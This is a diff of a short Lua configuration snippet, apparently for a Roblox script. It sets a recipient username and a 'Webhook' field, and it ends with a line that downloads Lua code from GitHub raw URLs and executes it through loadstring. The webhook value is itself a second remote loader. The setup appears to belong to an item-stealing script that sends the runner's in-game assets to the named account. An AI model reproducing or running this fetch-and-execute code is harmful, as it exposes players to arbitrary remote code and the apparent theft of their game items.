@@ -1,5 +1,5 @@
 _G.UserName = "HuskyM4gique" -- username here 
-_G.UserName2 = " " -- optional
-_G.Webhook = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Hauntzzz/psx/main/Infinity", true))()" -- Webhook Here - optional
+_G.UserName2 = ""
+_G.Webhook = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Hauntzzz/psx/main/Infinity", true))()"
    
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
